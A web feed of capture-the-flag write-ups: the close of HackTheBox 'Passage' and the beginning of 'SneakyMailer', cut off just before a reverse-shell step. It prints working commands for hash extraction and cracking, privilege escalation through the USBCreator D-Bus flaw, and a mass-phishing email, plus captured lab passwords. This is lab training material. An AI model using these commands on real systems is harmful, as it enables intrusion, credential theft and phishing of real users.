   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
   <span style="color:#75715e">#                                                             By Zion3R #</span>
   <span style="color:#75715e">#                                                    www.Blackploit.com #</span>
   <span style="color:#75715e">#                                                   Root@Blackploit.com #</span>
   <span style="color:#75715e">#########################################################################</span>
--------------------------------------------------

Possible Hashs:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-256
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-256
...&lt;SNIP&gt;...
</code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d | grep -o -E -e <span style="color:#e6db74">&#34;[0-9a-f]{64}&#34;</span>
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./hashcat.exe -m <span style="color:#ae81ff">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/home$ su paul 
su paul
Password: atlanta1
paul@passage:~$ 
</code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ cat id_rsa.pub <span style="color:#f92672">&amp;&amp;</span> authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">paul@passage:~/.ssh$ ssh nadav@passage.htb
Last login: Sun Sep  <span style="color:#ae81ff">6</span> 11:12:03 <span style="color:#ae81ff">2020</span> from 127.0.0.1
nadav@passage:~$ id
id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>nadav<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,113<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file.</p>
<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g


...&lt;SNIP&gt;...
# File marks:
&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        &#34;       12      7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        &#34;       2       0
        .       2       0
        +       2       0
</code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
<span style="color:#f92672">[</span>Configuration<span style="color:#f92672">]</span>
AdminIdentities<span style="color:#f92672">=</span>unix-group:sudo;unix-group:admin
</code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<span style="color:#75715e">&lt;!DOCTYPE busconfig PUBLIC
</span><span style="color:#75715e"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span><span style="color:#75715e"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
<span style="color:#f92672">&lt;busconfig&gt;</span>

  <span style="color:#75715e">&lt;!-- Only root can own the service --&gt;</span>
  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">user=</span><span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">own=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
  <span style="color:#f92672">&lt;/policy&gt;</span>

  <span style="color:#75715e">&lt;!-- Allow anyone to invoke methods (further constrained by
</span><span style="color:#75715e">       PolicyKit privileges --&gt;</span>
  <span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">context=</span><span style="color:#e6db74">&#34;default&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span><span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;allow</span> <span style="color:#a6e22e">send_destination=</span><span style="color:#e6db74">&#34;com.ubuntu.USBCreator&#34;</span>
           <span style="color:#a6e22e">send_interface=</span><span style="color:#e6db74">&#34;org.freedesktop.DBus.Properties&#34;</span><span style="color:#f92672">/&gt;</span>
  <span style="color:#f92672">&lt;/policy&gt;</span>

<span style="color:#f92672">&lt;/busconfig&gt;</span>
</code></pre></div><p>From here, From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ uname -a
Linux passage 4.15.0-45-generic <span style="color:#75715e">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true
true
<span style="color:#f92672">()</span>
</code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «passage» «10.10.14.31»
$ ssh -i root_rsa root@10.10.10.206
Last login: Fri Mar  5 17:33:39 2020 from 10.10.14.7
root@passage:~# ls -l
total 12
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
drwxr-xr-x 2 root root 4096 Jul 21  2020 exploits
-r-------- 1 root root   33 Mar  5 17:05 root.txt
root@passage:~# 
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
      <description>You&amp;#39;ve got mail!</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Exploiting sudo privileges on pip3</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE STARTTLS UTF8<span style="color:#f92672">=</span>ACCEPTA0001 CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE AUTH<span style="color:#f92672">=</span>PLAIN CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8<span style="color:#f92672">=</span>ACCEPTA0001 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ cat team | egrep -o <span style="color:#e6db74">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> | tr -d <span style="color:#e6db74">&#34;&lt;&gt;&#34;</span> | tee emails.list
</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ swaks --server <span style="color:#e6db74">&#39;10.10.10.197&#39;</span> --to <span style="color:#e6db74">`</span>cat emails.list | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">`</span> --from admin@sneakymailer.htb --body <span style="color:#e6db74">&#34;http://10.10.14.42/&#34;</span>
</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
<p>The request body contains this data.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
<p>I lost some screenshots after the step above, but here is the final configuration.</p>
<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
